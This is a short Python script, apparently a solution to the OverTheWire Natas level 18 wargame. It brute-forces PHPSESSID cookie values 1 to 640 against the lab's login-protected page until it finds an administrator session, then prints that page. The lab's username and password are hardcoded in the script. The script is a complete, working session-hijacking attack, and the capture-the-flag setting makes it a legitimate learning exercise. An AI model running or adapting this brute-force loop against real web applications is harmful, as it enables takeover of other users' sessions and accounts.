#!/usr/bin/python
#h15h4m

import requests
from requests.auth import HTTPBasicAuth


for i in range(1,641,1):
    cookies = dict(PHPSESSID=str(i))
    r = requests.get('http://natas18.natas.labs.overthewire.org/index.php',auth=HTTPBasicAuth('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'), cookies=cookies)
    if r.content.find('You are an admin') != -1:
        print '[+] FOUND ' + str(i)
        print r.content
    else:
        print '[!] ' + str(i)
